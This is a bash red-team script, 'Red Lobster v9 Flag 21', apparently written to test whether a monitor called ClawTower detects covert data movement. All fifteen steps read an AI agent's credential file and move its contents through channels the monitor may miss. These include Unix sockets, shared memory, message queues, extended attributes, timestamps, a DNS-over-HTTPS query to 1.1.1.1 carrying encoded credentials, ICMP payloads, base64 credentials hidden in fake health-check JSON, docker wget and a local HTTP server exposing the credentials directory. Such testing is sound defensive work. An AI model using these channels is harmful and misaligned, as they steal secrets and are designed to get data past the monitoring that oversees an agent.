#!/usr/bin/env bash
# Red Lobster v9 — Flag 21: COVERT CHANNELS
# Data movement through paths ClawTower doesn't monitor:
# IPC, metadata, alternative protocols.
# NO sudo. User-level only.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag21" "Flag 21: COVERT CHANNELS — Non-standard data movement"

CRED="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"

# ═══ Section A: IPC Mechanisms (5) ═══
echo "--- Section A: IPC Mechanisms ---"

# 1. Unix domain socket exfil — AF_UNIX not AF_INET, no network audit
rl_run "unix domain socket exfil" \
  "python3 -c \"
import socket, os, threading

SOCK = '$OUTDIR/rl9.sock'
if os.path.exists(SOCK): os.unlink(SOCK)

def server():
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(SOCK)
    s.listen(1)
    conn, _ = s.accept()
    data = conn.recv(65536)
    with open('$OUTDIR/21_1.txt','wb') as f: f.write(data)
    conn.close(); s.close()

t = threading.Thread(target=server, daemon=True)
t.start()

import time; time.sleep(0.1)
c = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
c.connect(SOCK)
c.sendall(open('$CRED','rb').read())
c.close()
t.join(timeout=2)
os.unlink(SOCK) if os.path.exists(SOCK) else None
\""

# 2. /dev/shm shared memory relay — tmpfs, no sentinel watch
rl_run "/dev/shm shared memory relay" \
  "cat '$CRED' > /dev/shm/rl9_shm.dat 2>/dev/null; cp /dev/shm/rl9_shm.dat '$OUTDIR/21_2.txt' 2>/dev/null; rm -f /dev/shm/rl9_shm.dat"

# 3. POSIX message queue via ctypes — kernel IPC, no filesystem I/O
rl_run "POSIX message queue" \
  "python3 -c \"
import ctypes, ctypes.util
rt = ctypes.CDLL(ctypes.util.find_library('rt') or 'librt.so.1')
data = open('$CRED','rb').read()[:8000]

# mq_open(name, O_CREAT|O_WRONLY, 0644, NULL)
mqd = rt.mq_open(b'/rl9test', 0o102, 0o644, None)
if mqd >= 0:
    rt.mq_send(mqd, data, len(data), 0)
    rt.mq_close(mqd)
    # Read back
    mqr = rt.mq_open(b'/rl9test', 0o0, 0, None)  # O_RDONLY
    if mqr >= 0:
        buf = ctypes.create_string_buffer(8192)
        prio = ctypes.c_uint(0)
        n = rt.mq_receive(mqr, buf, 8192, ctypes.byref(prio))
        if n > 0: open('$OUTDIR/21_3.txt','wb').write(buf.raw[:n])
        rt.mq_close(mqr)
    rt.mq_unlink(b'/rl9test')
\" 2>/dev/null; true"

# 4. Anonymous pipe relay — in-kernel pipe buffer
rl_run "anonymous pipe relay" \
  "cat '$CRED' | python3 -c \"import sys; open('$OUTDIR/21_4.txt','w').write(sys.stdin.read())\""

# 5. socketpair + fork — no bind/connect syscalls
rl_run "socketpair + fork" \
  "python3 -c \"
import socket, os
parent, child = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
pid = os.fork()
if pid == 0:
    parent.close()
    data = open('$CRED','rb').read()
    child.sendall(data)
    child.close()
    os._exit(0)
else:
    child.close()
    chunks = []
    while True:
        chunk = parent.recv(4096)
        if not chunk: break
        chunks.append(chunk)
    parent.close()
    open('$OUTDIR/21_5.txt','wb').write(b''.join(chunks))
    os.waitpid(pid, 0)
\""

# ═══ Section B: Filesystem Covert Channels (5) ═══
echo "--- Section B: Filesystem Covert Channels ---"

# 6. Extended attributes (xattr) — data in metadata, not content
rl_run "xattr covert channel" \
  "python3 -c \"
import os
data = open('$CRED','rb').read()
# Store cred data in xattr of an innocent file
with open('$OUTDIR/21_innocent.txt','w') as f: f.write('nothing to see here')
os.setxattr('$OUTDIR/21_innocent.txt', b'user.rl9data', data)
# Read it back from xattr
recovered = os.getxattr('$OUTDIR/21_innocent.txt', b'user.rl9data')
open('$OUTDIR/21_6.txt','wb').write(recovered)
\" 2>/dev/null; rm -f '$OUTDIR/21_innocent.txt'"

# 7. Sparse file holes — encode data as seek offsets
rl_run "sparse file hole encoding" \
  "python3 -c \"
import os
data = open('$CRED','rb').read()[:64]
# Encode each byte as a seek offset with a marker byte
fd = os.open('$OUTDIR/21_sparse.bin', os.O_WRONLY|os.O_CREAT|os.O_TRUNC, 0o644)
for i, b in enumerate(data):
    os.lseek(fd, i * 256 + b, os.SEEK_SET)
    os.write(fd, bytes([0xFF]))
os.close(fd)
# Decode
fd = os.open('$OUTDIR/21_sparse.bin', os.O_RDONLY)
result = []
for i in range(len(data)):
    for offset in range(256):
        os.lseek(fd, i * 256 + offset, os.SEEK_SET)
        if os.read(fd, 1) == b'\xff':
            result.append(offset)
            break
os.close(fd)
open('$OUTDIR/21_7.txt','wb').write(bytes(result))
\" 2>/dev/null; rm -f '$OUTDIR/21_sparse.bin'"

# 8. Directory entry encoding — base64 fragments as directory names
rl_run "directory entry encoding" \
  "python3 -c \"
import base64, os
data = open('$CRED','rb').read()[:128]
encoded = base64.b64encode(data).decode()
# Split into 16-char chunks, create dirs with those names
ddir = '$OUTDIR/21_dirs'
os.makedirs(ddir, exist_ok=True)
chunks = [encoded[i:i+16] for i in range(0, len(encoded), 16)]
for i, chunk in enumerate(chunks):
    safe = chunk.replace('/', '_')
    os.makedirs(os.path.join(ddir, f'{i:04d}_{safe}'), exist_ok=True)
# Reconstruct
parts = sorted(os.listdir(ddir))
recovered = ''.join(p.split('_', 1)[1].replace('_', '/') for p in parts)
open('$OUTDIR/21_8.txt','wb').write(base64.b64decode(recovered + '=='))
\" 2>/dev/null; rm -rf '$OUTDIR/21_dirs'"

# 9. File timestamp encoding — data hidden in mtime
rl_run "file timestamp encoding" \
  "python3 -c \"
import os, time
data = open('$CRED','rb').read()[:32]
tdir = '$OUTDIR/21_ts'
os.makedirs(tdir, exist_ok=True)
# Encode each byte as seconds offset in mtime
base = 1700000000
for i, b in enumerate(data):
    path = os.path.join(tdir, f'{i:04d}.ts')
    open(path,'w').close()
    os.utime(path, (base + b, base + b))
# Decode
result = []
for i in range(len(data)):
    path = os.path.join(tdir, f'{i:04d}.ts')
    mtime = int(os.path.getmtime(path))
    result.append(mtime - base)
open('$OUTDIR/21_9.txt','wb').write(bytes(result))
\" 2>/dev/null; rm -rf '$OUTDIR/21_ts'"

# 10. /proc/self/comm signaling — process name as data channel
rl_run "/proc/self/comm signaling" \
  "python3 -c \"
import ctypes, os
data = open('$CRED','rb').read()[:15]  # comm is max 16 bytes
libc = ctypes.CDLL('libc.so.6')
# Write cred fragment into process name
libc.prctl(15, data, 0, 0, 0)
# Another process could read /proc/<pid>/comm to extract data
comm = open('/proc/self/comm','rb').read().strip()
open('$OUTDIR/21_10.txt','wb').write(comm)
\""

# ═══ Section C: Network Covert Channels (5) ═══
echo "--- Section C: Network Covert Channels ---"

# 11. DNS-over-HTTPS exfil — looks like HTTPS, not dig/nslookup
rl_run "DNS-over-HTTPS exfil" \
  "python3 -c \"
import urllib.request, base64
data = open('$CRED','rb').read()[:48]
encoded = base64.b32encode(data).decode().lower().rstrip('=')
# Construct DoH query — the encoded data is in the subdomain
try:
    url = f'https://1.1.1.1/dns-query?name={encoded[:63]}.rl9test.local&type=TXT'
    req = urllib.request.Request(url, headers={'Accept':'application/dns-json'})
    urllib.request.urlopen(req, timeout=2)
except: pass
\" 2>/dev/null; true"

# 12. ICMP payload — raw ICMP socket with cred data
rl_run "ICMP payload encoding" \
  "python3 -c \"
import socket, struct
data = open('$CRED','rb').read()[:56]
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # Build ICMP echo request with cred data in payload
    icmp_type = 8  # echo request
    icmp_code = 0
    checksum = 0
    ident = 0x5239  # 'R9'
    seq = 1
    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, ident, seq)
    packet = header + data
    # Compute checksum
    s_sum = 0
    for i in range(0, len(packet), 2):
        w = packet[i] + ((packet[i+1] << 8) if i+1 < len(packet) else 0)
        s_sum += w
    s_sum = (s_sum >> 16) + (s_sum & 0xffff)
    s_sum = ~s_sum & 0xffff
    header = struct.pack('!BBHHH', icmp_type, icmp_code, s_sum, ident, seq)
    s.sendto(header + data, ('127.0.0.1', 0))
    s.close()
except PermissionError: pass  # Raw sockets may require CAP_NET_RAW
except: pass
\" 2>/dev/null; true"

# 13. Steganographic HTTP — cred hidden inside benign-looking JSON
rl_run "steganographic HTTP" \
  "python3 -c \"
import http.client, json, base64
cred = open('$CRED','rb').read()
payload = json.dumps({
    'event': 'health_check',
    'status': 'ok',
    'log_context': base64.b64encode(cred).decode(),
    'timestamp': '2026-02-20T12:00:00Z'
})
try:
    c = http.client.HTTPConnection('127.0.0.1', 19999, timeout=2)
    c.request('POST', '/api/health', payload, {'Content-Type':'application/json'})
except: pass
\""

# 14. Docker network exfil — container bypasses host iptables
rl_run "docker network exfil" \
  "docker run --rm alpine wget -q -O- http://ifconfig.me > '$OUTDIR/21_14.txt' 2>/dev/null"

# 15. Localhost HTTP staging — serve cred dir on localhost
rl_run "localhost HTTP staging" \
  "timeout 3 python3 -m http.server 9999 --directory /home/openclaw/.openclaw/credentials &>/dev/null & SRVPID=\$!; sleep 1; curl -s http://127.0.0.1:9999/ > '$OUTDIR/21_15.txt' 2>/dev/null; kill \$SRVPID 2>/dev/null; wait \$SRVPID 2>/dev/null; true"

rl_summary
rl_cleanup
